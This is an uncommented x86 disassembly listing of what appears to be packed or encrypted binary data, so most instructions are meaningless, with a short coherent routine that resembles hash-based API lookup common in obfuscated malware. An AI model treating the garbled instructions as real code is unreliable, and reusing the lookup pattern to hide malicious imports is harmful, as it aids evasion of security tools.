  41a6cb:	xor    ecx,DWORD PTR [ecx+0x5d]
  41a6ce:	retf   
  41a6cf:	in     al,0x4a
  41a6d1:	add    dl,BYTE PTR [esi+0x73]
  41a6d4:	xor    al,0xa6
  41a6d6:	stc    
  41a6d7:	imul   edi,DWORD PTR [ebx+edi*4+0x17],0xffffffa5
  41a6dc:	xchg   ecx,eax
  41a6dd:	xchg   ecx,eax
  41a6de:	fdiv   QWORD PTR [edx-0x75a01708]
  41a6e4:	push   ebp
  41a6e5:	push   esi
  41a6e6:	(bad)  
  41a6e7:	mov    cl,0x1a
  41a6e9:	jmp    0x41a746
  41a6eb:	rcl    eax,0xf0
  41a6ee:	stc    
  41a6ef:	arpl   si,sp
  41a6f1:	test   BYTE PTR [ecx+esi*1-0x7ade7a3c],ch
  41a6f8:	mov    WORD PTR [ebp+0xe53b6b9],?
  41a6fe:	std    
  41a6ff:	iret   
  41a700:	mov    al,0x9e
  41a702:	gs push 0x81e43a86
  41a708:	dec    esp
  41a709:	nop
  41a70a:	dec    ebp
  41a70b:	jns    0x41a753
  41a70d:	pusha  
  41a70e:	mov    ah,0xb2
  41a710:	gs xchg ecx,eax
  41a712:	xlat   BYTE PTR ds:[ebx]
  41a713:	pop    ebp
  41a714:	sub    bl,ah
  41a716:	out    0xdd,al
  41a718:	aaa    
  41a719:	push   esi
  41a71a:	repz jb 0x41a6db
  41a71d:	std    
  41a71e:	sbb    DWORD PTR [eax-0x7c8ffa86],esp
  41a724:	push   es
  41a725:	sub    esp,0xf413254e
  41a72b:	fidiv  WORD PTR [ebx-0x6d]
  41a72e:	in     al,dx
  41a72f:	in     al,0x16
  41a731:	nop
  41a732:	add    dh,bl
  41a734:	push   edx
  41a735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a736:	lahf   
  41a737:	pusha  
  41a738:	outs   dx,BYTE PTR ds:[esi]
  41a739:	adc    dl,BYTE PTR [edx-0x1b]
  41a73c:	cli    
  41a73d:	pop    es
  41a73e:	call   0x34e9:0x167959bd
  41a745:	gs loop 0x41a6f0
  41a748:	dec    esp
  41a749:	enter  0xa772,0x35
  41a74d:	jge    0x41a6e9
  41a74f:	jno    0x41a79e
  41a751:	adc    DWORD PTR [ebp+0x441bb449],esp
  41a757:	ds loopne 0x41a711
  41a75a:	and    dh,BYTE PTR [eax+0x34d745f5]
  41a760:	into   
  41a761:	jbe    0x41a6e4
  41a763:	jb     0x41a701
  41a765:	dec    edx
  41a766:	sbb    BYTE PTR [ebx+esi*4-0xb],0xf0
  41a76b:	pop    edi
  41a76c:	ror    DWORD PTR [edx+ecx*8-0x77403cb],1
  41a773:	pop    ecx
  41a774:	add    eax,0x626dabac
  41a779:	pop    es
  41a77a:	inc    ecx
  41a77b:	in     al,dx
  41a77c:	out    dx,al
  41a77d:	sub    eax,0xcdd2f9fd
  41a782:	imul   BYTE PTR [ebx-0xe]
  41a785:	and    edi,0x43
  41a788:	sub    al,0xbf
  41a78a:	repz pushf 
  41a78c:	ficomp DWORD PTR [esi]
  41a78e:	(bad)  
  41a78f:	push   edi
  41a790:	leave  
  41a791:	xchg   ebx,eax
  41a792:	adc    ah,BYTE PTR [edx]
  41a794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a795:	in     al,0x68
  41a797:	mov    ecx,0xf7f21f0e
  41a79c:	sub    al,BYTE PTR [ebx-0x1b971f6f]
  41a7a2:	stc    
  41a7a3:	retf   
  41a7a4:	ret    0x6f13
  41a7a7:	or     eax,0x9b33bdbc
  41a7ac:	jmp    0xab9d:0xdd884d92
  41a7b3:	(bad)  
  41a7b5:	sbb    eax,0x95a00f30
  41a7ba:	inc    ebp
  41a7bb:	sub    edi,eax
  41a7bd:	jl     0x41a7f3
  41a7bf:	mov    ah,0x3e
  41a7c1:	shl    BYTE PTR [esi+0x393da2bf],cl
  41a7c7:	out    dx,al
  41a7c8:	nop
  41a7c9:	adc    BYTE PTR [esi-0x58c8459b],al
  41a7cf:	jne    0x41a7b0
  41a7d1:	dec    ebx
  41a7d2:	pop    ds
  41a7d3:	nop
  41a7d4:	pop    ebp
  41a7d5:	inc    edx
  41a7d6:	mov    ah,0x6b
  41a7d8:	or     eax,0xe0a322bf
  41a7dd:	or     eax,0xe2986791
  41a7e2:	push   esp
  41a7e3:	push   ebx
  41a7e4:	iret   
  41a7e5:	hlt    
  41a7e6:	sub    edx,ebp
  41a7e8:	hlt    
  41a7e9:	ret    
  41a7ea:	imul   esp,DWORD PTR [ebx-0x5ed41fb1],0xfad0aa4f
  41a7f4:	mov    ds:0x1ed98abd,al
  41a7f9:	and    edx,DWORD PTR [ecx+0x52]
  41a7fc:	push   cs
  41a7fd:	mov    BYTE PTR [edx+0x5c],cl
  41a800:	lods   eax,DWORD PTR ds:[esi]
  41a801:	sub    eax,0x21c07bc8
  41a806:	push   cs
  41a807:	xchg   edi,eax
  41a808:	jecxz  0x41a7aa
  41a80a:	sub    DWORD PTR [eax],esp
  41a80c:	iretw  
  41a80e:	pusha  
  41a80f:	aad    0x80
  41a811:	pop    esp
  41a812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a813:	and    BYTE PTR [edi-0x6a],0x12
  41a817:	xor    DWORD PTR [ecx+0x1f779508],ebp
  41a81d:	shr    dh,cl
  41a81f:	jno    0x41a84b
  41a821:	adc    eax,0x78887ac9
  41a826:	xor    eax,0x3e786ce8
  41a82b:	cld    
  41a82c:	ret    0x9d12
  41a82f:	adc    edi,ebp
  41a831:	inc    ebx
  41a832:	pusha  
  41a833:	cli    
  41a834:	jns    0x41a849
  41a836:	test   DWORD PTR [edi+0x2086b5f0],edi
  41a83c:	xchg   esp,eax
  41a83d:	sub    al,0x82
  41a83f:	fistp  QWORD PTR ds:0xc1edb139
  41a845:	dec    eax
  41a846:	sbb    ah,0xec
  41a849:	add    eax,esi
  41a84b:	aam    0xb1
  41a84d:	push   ebp
  41a84e:	cmp    BYTE PTR [esi-0x1aa2a5d2],ah
  41a854:	test   al,0x4f
  41a856:	fcom   st(4)
  41a858:	inc    esi
  41a859:	(bad)  
  41a85a:	jns    0x41a8d2
  41a85c:	push   edx
  41a85d:	xor    DWORD PTR [ecx+eax*2-0x13],edi
  41a861:	push   esi
  41a862:	shl    ecx,0x4c
  41a865:	mov    edi,0x322afce8
  41a86a:	out    dx,eax
  41a86b:	mov    eax,ds:0x7ef230f7
  41a870:	in     eax,0x91
  41a872:	ins    DWORD PTR es:[edi],dx
  41a873:	mov    fs,edx
  41a875:	sbb    cl,dl
  41a877:	mov    al,0x32
  41a879:	lea    ebp,[esi+0x69]
  41a87c:	mov    eax,ds:0x37732945
  41a881:	out    0x86,al
  41a883:	add    al,0x58
  41a885:	stos   BYTE PTR es:[edi],al
  41a886:	mov    bh,0x2f
  41a888:	call   0xdf4e:0x28a3bba3
  41a88f:	daa    
  41a890:	adc    al,0x26
  41a892:	ficom  DWORD PTR [edi]
  41a894:	iret   
  41a895:	aad    0xd6
  41a897:	lfs    ebx,FWORD PTR [edi]
  41a89a:	fmulp  st(0),st
  41a89c:	xor    BYTE PTR [edx+0x7a],0xa4
  41a8a0:	push   ecx
  41a8a1:	sbb    al,0xcd
  41a8a3:	(bad)  
  41a8a5:	and    edi,DWORD PTR [eax-0x52f9a47f]
  41a8ab:	jne    0x41a83d
  41a8ad:	adc    al,0xdf
  41a8af:	jg     0x41a8b5
  41a8b1:	in     eax,dx
  41a8b2:	add    eax,ebx
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	sbb    DWORD PTR [esi],0x67
  41a917:	mov    eax,ds:0x7fd5486c
  41a91c:	js     0x41a92e
  41a91e:	jle    0x41a998
  41a920:	js     0x41a93d
  41a922:	push   ecx
  41a923:	cld    
  41a924:	(bad)  
  41a926:	retf   0x4d1f
  41a929:	xor    al,0x9a
  41a92b:	push   0xb96a7fff
  41a930:	xchg   DWORD PTR [ebp+0x204f24e9],ebx
  41a936:	push   0x9be414e3
  41a93b:	mov    al,ds:0xdf9f3898
  41a940:	pusha  
  41a941:	js     0x41a8dd
  41a943:	adc    eax,0xc58f5998
  41a948:	cmp    BYTE PTR [edx+0x4653f18c],ah
  41a94e:	xchg   edx,eax
  41a94f:	int    0x90
  41a951:	push   edx
  41a952:	std    
  41a953:	push   bp
  41a955:	mov    BYTE PTR [eax-0x7eae3bb2],ch
  41a95b:	in     al,dx
  41a95c:	adc    ah,BYTE PTR [edx+0x2d9218fe]
  41a962:	stos   DWORD PTR es:[edi],eax
  41a963:	mov    ecx,0xe6447297
  41a968:	mov    eax,0x8e183861
  41a96d:	xor    al,0x9a
  41a96f:	mov    gs,WORD PTR [esi+0x6175f3b]
  41a975:	int3   
  41a976:	(bad)  
  41a977:	addr16 push edi
  41a979:	add    bh,dh
  41a97b:	pop    eax
  41a97c:	pop    edx
  41a97d:	scas   al,BYTE PTR es:[edi]
  41a97e:	or     ah,BYTE PTR [edi]
  41a980:	mov    edi,0x214e5ab4
  41a985:	rol    BYTE PTR [edi+0x20a1dfee],0x47
  41a98c:	push   es
  41a98d:	push   eax
  41a98e:	(bad)  
  41a98f:	imul   edx,DWORD PTR [ebp-0x108a7338],0xc89e15e
  41a999:	pop    edx
  41a99a:	pop    ecx
  41a99b:	dec    ecx
  41a99c:	div    DWORD PTR [esp+esi*4-0x27]
  41a9a0:	push   ebx
  41a9a1:	dec    esi
  41a9a2:	xor    BYTE PTR [edi],dh
  41a9a4:	mov    edx,0x2431885d
  41a9a9:	xchg   bh,ch
  41a9ab:	adc    eax,DWORD PTR [edx+0x44]
  41a9ae:	dec    edx
  41a9af:	fcmovbe st,st(4)
  41a9b1:	mov    edx,DWORD PTR [edi-0x3ad3e40]
  41a9b7:	pop    esp
  41a9b8:	jle    0x41a93b
  41a9ba:	cmc    
  41a9bb:	pop    edi
  41a9bc:	les    esi,FWORD PTR [edx+0x52]
  41a9bf:	cmp    al,0xc1
  41a9c1:	add    DWORD PTR [ebx],ecx
  41a9c3:	sar    BYTE PTR [edx+edi*1+0x34],1
  41a9c7:	add    al,0x3f
  41a9c9:	or     esi,DWORD PTR [ebx+0x4cf6a73f]
  41a9cf:	push   eax
  41a9d0:	xchg   ecx,eax
  41a9d1:	jg     0x41a9c6
  41a9d3:	neg    BYTE PTR [edx+ecx*8+0x74]
  41a9d7:	and    BYTE PTR [esi-0x126d595f],cl
  41a9dd:	mov    al,ds:0x947de84c
  41a9e2:	pop    ebp
  41a9e3:	dec    eax
  41a9e4:	popa   
  41a9e5:	in     eax,dx
  41a9e6:	mov    dl,BYTE PTR [ebx-0x26de6d5e]
  41a9ec:	jns    0x41aa55
  41a9ee:	lahf   
  41a9ef:	and    DWORD PTR [edi-0x164bc523],esp
  41a9f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9f6:	add    cl,BYTE PTR [edi]
  41a9f8:	mov    ds:0x4f40d302,al
  41a9fe:	aaa    
  41a9ff:	jp     0x41a9f1
  41aa01:	ins    BYTE PTR es:[edi],dx
  41aa02:	inc    eax
  41aa03:	mov    esi,0xe6ae1ba2
  41aa08:	(bad)  
  41aa09:	mov    al,ds:0x14892a19
  41aa0e:	push   es
  41aa0f:	xor    DWORD PTR ss:[ecx-0x49af86bb],ebp
  41aa16:	stos   DWORD PTR es:[edi],eax
  41aa17:	out    dx,eax
  41aa18:	add    al,0x70
  41aa1a:	adc    eax,0xc364254d
  41aa1f:	iret   
  41aa20:	sub    eax,0x23ee21b2
  41aa25:	std    
  41aa26:	fwait
  41aa27:	int3   
  41aa28:	icebp  
  41aa29:	cmp    dh,BYTE PTR [ecx]
  41aa2b:	sahf   
  41aa2c:	push   cs
  41aa2d:	xchg   ebp,eax
  41aa2e:	in     al,0xb4
  41aa30:	cmc    
  41aa31:	cmp    eax,0x671c50e9
  41aa36:	mov    ebx,DWORD PTR [edi+0x661f4aa8]
  41aa3c:	fbld   TBYTE PTR [ecx]
  41aa3e:	ins    DWORD PTR es:[edi],dx
  41aa3f:	push   0xa735f636
  41aa44:	es jb  0x41aa86
  41aa47:	mov    edx,0xa043f66a
  41aa4c:	lock lea ebx,[edi+0x1d]
  41aa50:	add    eax,0x88b9eaac
  41aa55:	fld    TBYTE PTR [ebp*8-0x609ac9f6]
  41aa5c:	std    
  41aa5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa5e:	mov    ss,WORD PTR [eax]
  41aa60:	jle    0x41aa64
  41aa62:	(bad)  
  41aa63:	imul   ecx,DWORD PTR ds:[edi-0x7414c912],0xffffffa5
  41aa6b:	(bad)  
  41aa6c:	(bad)  
  41aa6d:	pop    ds
  41aa6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa6f:	push   ecx
  41aa70:	ret    
  41aa71:	loop   0x41aa35
  41aa73:	(bad)  
  41aa74:	shl    BYTE PTR [edx+0x58],cl
  41aa77:	lds    ebx,FWORD PTR [edx-0x18]
  41aa7a:	out    dx,al
  41aa7b:	test   al,0x5a
  41aa7d:	outs   dx,DWORD PTR ds:[esi]
  41aa7e:	mov    edi,0x4167b597
  41aa83:	pop    edi
  41aa84:	fld    TBYTE PTR [eax]
  41aa86:	dec    esp
  41aa87:	pusha  
  41aa88:	adc    bh,BYTE PTR [ebp+eiz*4+0xfc979e9]
  41aa8f:	push   cs
  41aa90:	mov    ah,0x87
  41aa92:	out    dx,eax
  41aa93:	aas    
  41aa94:	jmp    0x488d:0x52e92ae2
  41aa9b:	mov    bl,0x35
  41aa9d:	jg     0x41aa55
  41aa9f:	and    DWORD PTR [eax+0x4a],edx
  41aaa2:	push   ds
  41aaa3:	outs   dx,DWORD PTR ds:[esi]
  41aaa4:	push   cs
  41aaa5:	jle    0x41aa90
  41aaa7:	xor    eax,0x12c53740
  41aaac:	and    BYTE PTR [edx+eax*4-0x7e4e4218],0xa4
  41aab4:	loopne 0x41ab24
  41aab6:	mov    eax,0xb10396e5
  41aabb:	(bad)  
  41aabc:	push   0xffffffdb
  41aabe:	mov    bh,0x40
  41aac0:	scas   eax,DWORD PTR es:[edi]
  41aac1:	adc    DWORD PTR [eax+0x66a5f05b],eax
  41aac7:	lods   al,BYTE PTR ds:[esi]
  41aac8:	aad    0x35
  41aaca:	cmp    cl,BYTE PTR [esi-0x70698785]
  41aad0:	(bad)
  41aad3:	jmp    0x6f4:0x83f7979a
  41aada:	(bad)  
  41aadb:	push   ecx
  41aadc:	sbb    DWORD PTR [esi-0x7cda0ed8],esi
  41aae2:	shl    edi,cl
  41aae4:	pop    esi
  41aae5:	scas   al,BYTE PTR es:[edi]
  41aae6:	pop    eax
  41aae7:	mov    ecx,0x1c07b
  41aaec:	enter  0xa84c,0x3e
  41aaf0:	add    ah,BYTE PTR [eax+0x26cfcb85]
  41aaf6:	out    dx,eax
  41aaf7:	push   edi
  41aaf8:	loope  0x41ab5a
  41aafa:	dec    edx
  41aafb:	ret    0xb4f5
  41aafe:	mov    esp,0x2053fb96
  41ab03:	addr16 pop ss
  41ab05:	or     DWORD PTR [ecx+0x9ba9d21],0x32d9eb45
  41ab0f:	adc    DWORD PTR [ebx+0x7f9e1a86],esp
  41ab15:	sub    eax,0x2ce08e3f
  41ab1a:	(bad)  
  41ab1b:	loope  0x41aaae
  41ab1d:	fdivr  DWORD PTR [ebp-0x2e]
  41ab20:	stc    
  41ab21:	rcl    ebp,1
  41ab23:	shl    BYTE PTR [ebp+0x12],1
  41ab26:	push   ss
  41ab27:	test   BYTE PTR [ebx],al
  41ab29:	pushf  
  41ab2a:	es (bad) 
  41ab2c:	cmp    BYTE PTR [ebp+0x3440e01b],dl
  41ab32:	mov    eax,0xeae45c0b
  41ab37:	ficom  DWORD PTR [ecx+ebx*2+0x5b49056a]
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0xc2c80ebe
  41ab52:	mov    edx,0x787fdb60
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41abd6
  41ab5c:	fsubr  DWORD PTR [ebx+0x452cb6ff]
  41ab62:	mov    bh,0x12
  41ab64:	sbb    BYTE PTR [ebp+ecx*1+0x40],al
  41ab68:	int    0x98
  41ab6a:	cmp    eax,0xebf07c4d
  41ab6f:	sub    DWORD PTR [ecx+0x648fe8f5],esp
  41ab75:	(bad)  
  41ab77:	imul   edx,edi,0x4221d2f
  41ab7d:	add    al,0x36
  41ab7f:	push   ebx
  41ab80:	pop    eax
  41ab81:	test   al,0xf9
  41ab83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab84:	jno    0x41ab94
  41ab86:	mov    dh,ch
  41ab88:	stos   BYTE PTR es:[edi],al
  41ab89:	lds    edi,FWORD PTR [eax+0x22]
  41ab8c:	fs pop eax
  41ab8e:	pop    edi
  41ab8f:	mov    esp,0x2f43174b
  41ab94:	adc    BYTE PTR [ecx],cl
  41ab96:	test   eax,0x9639174b
  41ab9b:	lahf   
  41ab9c:	das    
  41ab9d:	push   eax
  41ab9e:	fimul  DWORD PTR [ebp-0x1e8d890c]
  41aba4:	inc    esi
  41aba5:	shl    BYTE PTR [ebx+0x6c50a0f4],0xa9
  41abac:	jb     0x41abaa
  41abae:	bound  edx,QWORD PTR [esi-0x61]
  41abb1:	fnstsw WORD PTR [eax-0x1b]
  41abb4:	xor    esp,ecx
  41abb6:	bound  esp,QWORD PTR [ecx]
  41abb8:	jecxz  0x41ab3d
  41abba:	lock aad 0x1a
  41abbd:	mov    bl,0x99
  41abbf:	loop   0x41ab4b
  41abc1:	sub    al,0x97
  41abc3:	add    BYTE PTR [eax-0x655c3d69],0x86
  41abca:	shl    DWORD PTR [edi],0xa2
  41abcd:	dec    esp
  41abce:	or     ch,BYTE PTR [ecx+esi*2]
  41abd1:	test   DWORD PTR [ebx-0x2f],edx
  41abd4:	xchg   edi,ecx
  41abd6:	addr16 jge 0x41ab81
  41abd9:	add    eax,DWORD PTR [edi-0x61]
  41abdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abdd:	pop    edx
  41abde:	sub    bl,BYTE PTR [ebx-0x37]
  41abe1:	sub    BYTE PTR [ebp+0x57],dh
  41abe4:	sub    BYTE PTR [ebx],bl
  41abe6:	inc    eax
  41abe7:	(bad)  
  41abe9:	or     ebx,ebp
  41abeb:	hlt    
  41abec:	or     BYTE PTR [ecx+edx*1],0xd
  41abf0:	mov    dl,0xe2
  41abf2:	and    cl,BYTE PTR [esi+0x6c]
  41abf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf6:	retf   
  41abf7:	in     eax,dx
  41abf8:	in     al,0x6
  41abfa:	and    eax,0x4c8bc539
  41abff:	pop    eax
  41ac00:	out    0x18,eax
  41ac02:	pop    ss
  41ac03:	ss xor eax,0x811249c5
  41ac09:	repnz mov ds:0x179dfed6,al
  41ac0f:	pop    ss
  41ac10:	shl    BYTE PTR [ebx+0x1a],0xdc
  41ac14:	xor    al,0x5a
  41ac16:	(bad)  
  41ac17:	ss test al,0xd8
  41ac1a:	lods   al,BYTE PTR ds:[esi]
  41ac1b:	xor    BYTE PTR [esi+0x5e],cl
  41ac1e:	cmp    edi,DWORD PTR [ecx-0x3ce341f2]
  41ac24:	fdiv   st(7),st
  41ac26:	mov    eax,0x5e6e5980
  41ac2b:	mov    eax,ds:0x355ea775
  41ac30:	inc    ecx
  41ac31:	mov    ds:0xb0af90dc,eax
  41ac36:	and    ah,BYTE PTR [ecx+eax*2]
  41ac39:	scas   al,BYTE PTR es:[edi]
  41ac3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac3b:	xor    ecx,DWORD PTR [eax]
  41ac3d:	adc    al,0x93
  41ac3f:	arpl   WORD PTR [ebp-0xd],ax
  41ac42:	push   eax
  41ac43:	and    dh,dh
  41ac45:	or     DWORD PTR [edi+0x33],0xcb317dc9
  41ac4c:	ins    DWORD PTR es:[edi],dx
  41ac4d:	popa   
  41ac4e:	dec    edi
  41ac4f:	mov    ch,0xae
  41ac51:	scas   eax,DWORD PTR es:[edi]
  41ac52:	fisub  WORD PTR [eax]
  41ac54:	js     0x41ac32
  41ac56:	sbb    ebx,edx
  41ac58:	ins    DWORD PTR es:[edi],dx
  41ac59:	mov    ds:0x2b235aa9,al
  41ac5e:	fwait
  41ac5f:	lods   eax,DWORD PTR ds:[esi]
  41ac60:	adc    eax,0xff50a534
  41ac65:	adc    dl,BYTE PTR [ebx+0x72b26ff7]
  41ac6b:	loope  0x41acc2
  41ac6d:	data16 sub al,0x87
  41ac70:	(bad)  
  41ac71:	add    ch,BYTE PTR [ecx-0x7b]
  41ac74:	imul   ecx,DWORD PTR ds:0x417d46c7,0xffffffde
  41ac7b:	ja     0x41ac8a
  41ac7d:	ret    0x74fe
  41ac80:	stc    
  41ac81:	pusha  
  41ac82:	mov    al,ds:0x2b0e3242
  41ac87:	pusha  
  41ac88:	imul   ebp,DWORD PTR [esi+0x47],0xffffffee
  41ac8c:	test   DWORD PTR [eax-0x1e4e0a8b],edx
  41ac92:	pusha  
  41ac93:	addr16 push eax
  41ac95:	inc    ecx
  41ac96:	sbb    BYTE PTR [ecx-0xc57a44e],0xfb
  41ac9d:	inc    ecx
  41ac9e:	cmp    bl,dh
  41aca0:	xchg   bl,ch
  41aca2:	mov    dh,0x12
  41aca4:	push   ecx
  41aca5:	dec    ebx
  41aca6:	push   ecx
  41aca7:	add    BYTE PTR [eax-0x5f2d6ba1],bh
  41acad:	pop    edi
  41acae:	gs out 0x52,al
  41acb1:	popf   
  41acb2:	jne    0x41ad28
  41acb4:	lahf   
  41acb5:	xor    eax,0x3ef1c30
  41acba:	or     cl,0x18
  41acbd:	inc    ebx
  41acbe:	enter  0x72f1,0x1d
  41acc2:	sub    edx,ecx
  41acc4:	or     ecx,ecx
  41acc6:	push   eax
  41acc7:	lahf   
  41acc8:	mov    bl,0xfe
  41acca:	mov    ss,WORD PTR [edx-0x72]
  41accd:	push   esi
  41acce:	icebp  
  41accf:	mov    bh,0x81
  41acd1:	mov    dh,0x36
  41acd3:	dec    edi
  41acd4:	jge    0x41ac74
  41acd6:	sub    DWORD PTR [edi],ebx
  41acd8:	mov    ebp,0x3057b4fb
  41acdd:	stos   BYTE PTR es:[edi],al
  41acde:	in     al,dx
  41acdf:	or     ah,BYTE PTR [ebp-0x14]
  41ace2:	fs mov ebx,?
  41ace5:	inc    edi
  41ace6:	icebp  
  41ace7:	mov    ds:0xd9c9182c,al
  41acec:	cmp    eax,0x88a9c1ad
  41acf1:	(bad)  
  41acf2:	push   esp
  41acf3:	je     0x41acfb
  41acf5:	lods   al,BYTE PTR ds:[esi]
  41acf6:	dec    edi
  41acf7:	mov    dl,0x6
  41acf9:	dec    ebx
  41acfa:	adc    dh,BYTE PTR [ebp-0x45]
  41acfd:	pop    esi
  41acfe:	sbb    eax,0xfa2ae43c
  41ad03:	lods   eax,DWORD PTR ds:[esi]
  41ad04:	or     DWORD PTR [eax],edx
  41ad06:	jb     0x41acf2
  41ad08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad09:	mov    al,ds:0xd785e11a
  41ad0e:	sub    esp,DWORD PTR [ecx+ebx*4-0xb499222]
  41ad15:	call   0x5bf14998
  41ad1a:	test   al,0xb6
  41ad1c:	cmp    dh,al
  41ad1e:	mov    ecx,DWORD PTR [ecx+0x71]
  41ad21:	or     eax,0x3800cbe2
  41ad26:	repnz pusha 
  41ad28:	xor    al,bh
  41ad2a:	sar    BYTE PTR [eax-0x43],0x79
  41ad2e:	mov    esi,0x374b77fe
  41ad33:	push   ds
  41ad34:	sar    BYTE PTR [edi-0x21],1
  41ad37:	adc    DWORD PTR ds:0xbafdd28c,esi
  41ad3d:	cli    
  41ad3e:	mov    ecx,0xf42bc829
  41ad43:	mov    ch,0x4e
  41ad45:	out    dx,al
  41ad46:	inc    esp
  41ad47:	sbb    BYTE PTR [esi+0x3b46403c],cl
  41ad4d:	xor    ah,BYTE PTR [edi+ebp*4]
  41ad50:	loopne 0x41ad3b
  41ad52:	imul   eax,DWORD PTR [edx+0x417df7cd],0xffffffca
  41ad59:	mov    ebx,0x7a3e63ed
  41ad5e:	dec    ebp
  41ad5f:	fwait
  41ad60:	xor    eax,0xda34a898
  41ad65:	xor    ebp,edx
  41ad67:	aas    
  41ad68:	popa   
  41ad69:	icebp  
  41ad6a:	mov    bh,0x99
  41ad6c:	retf   0x4063
  41ad6f:	fdivr  QWORD PTR [esp+ecx*1+0x2bcb873b]
  41ad76:	fldl2t 
  41ad78:	xor    BYTE PTR [edx],al
  41ad7a:	add    BYTE PTR [eax],al
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0xa4d25295,eax
  41ad89:	push   0x61
  41ad8b:	pop    ss
  41ad8c:	js     0x41ad66
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41ad2c
  41ad95:	daa    
  41ad96:	xlat   BYTE PTR ds:[ebx]
  41ad97:	xor    eax,DWORD PTR [ecx]
  41ad99:	inc    edi
  41ad9a:	add    BYTE PTR [eax],0xcc
  41ad9d:	fsubr  QWORD PTR [eax-0x63]
  41ada0:	lds    edi,FWORD PTR [edx]
  41ada2:	inc    esi
  41ada3:	imul   DWORD PTR [esi]
  41ada5:	xchg   ebx,eax
  41ada6:	hlt    
  41ada7:	push   es
  41ada8:	mov    al,ds:0xd55d83a2
  41adad:	cli    
  41adae:	inc    edx
  41adaf:	jle    0x41ad71
  41adb1:	in     al,0x9d
  41adb3:	ins    DWORD PTR es:[edi],dx
  41adb4:	fbld   TBYTE PTR [ecx-0x2e6f4e53]
  41adba:	enter  0x45ce,0xc8
  41adbe:	jp     0x41ad74
  41adc0:	jnp    0x41ae11
  41adc2:	mov    al,0x6
  41adc4:	xchg   esp,eax
  41adc5:	nop
  41adc6:	fwait
  41adc7:	aaa    
  41adc8:	mov    ch,0xc0
  41adca:	jmp    0xf271b673
  41adcf:	ja     0x41ad94
  41add1:	add    edx,0xc9a89af5
  41add7:	lds    ecx,FWORD PTR [esi]
  41add9:	leave  
  41adda:	xor    BYTE PTR [edi+0x47204287],ah
  41ade0:	or     eax,esi
  41ade2:	sahf   
  41ade3:	mov    esi,0xd63ecc9c
  41ade8:	scas   eax,DWORD PTR es:[edi]
  41ade9:	and    BYTE PTR [edi+edx*4],bl
  41adec:	jg     0x41ad94
  41adee:	je     0x41ae59
  41adf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adf1:	sti    
  41adf2:	xor    dl,BYTE PTR [esi-0x78]
  41adf5:	(bad)  
  41adf6:	push   ss
  41adf7:	jae    0x41adba
  41adf9:	xchg   ecx,eax
  41adfa:	add    DWORD PTR [eax],ebx
  41adfc:	cmp    bl,BYTE PTR [esi+0x6cde19b4]
  41ae02:	push   eax
  41ae03:	dec    esp
  41ae04:	or     eax,0xe6398618
  41ae09:	mov    al,0xb8
  41ae0b:	xchg   ebp,eax
  41ae0c:	and    BYTE PTR [esi+0x410cc8cf],bl
  41ae12:	maxps  xmm6,XMMWORD PTR [ebp+0x172dd16e]
  41ae19:	lea    eax,[edx+0x24]
  41ae1c:	sahf   
  41ae1d:	ins    BYTE PTR es:[edi],dx
  41ae1e:	mov    ecx,0x98694eb8
  41ae23:	in     al,dx
  41ae24:	dec    edi
  41ae25:	pop    ss
  41ae26:	push   esp
  41ae27:	faddp  st(4),st
  41ae29:	aam    0xf
  41ae2b:	push   cs
  41ae2c:	test   DWORD PTR [ecx-0x44b78d19],ecx
  41ae32:	imul   esi,DWORD PTR [eax-0x72],0x26
  41ae36:	xor    eax,0xf76f78b2
  41ae3b:	push   0x3c859106
  41ae40:	mov    gs,WORD PTR [esi+edx*1+0x68]
  41ae44:	xor    eax,0xb06b4a4e
  41ae49:	out    dx,al
  41ae4a:	jle    0x41ae82
  41ae4c:	jnp    0x41aeaf
  41ae4e:	out    0x99,eax
  41ae50:	sub    ebx,DWORD PTR [edx-0x1a]
  41ae53:	adc    bh,0xba
  41ae56:	mov    eax,0xa8f50a93
  41ae5b:	sub    ecx,eax
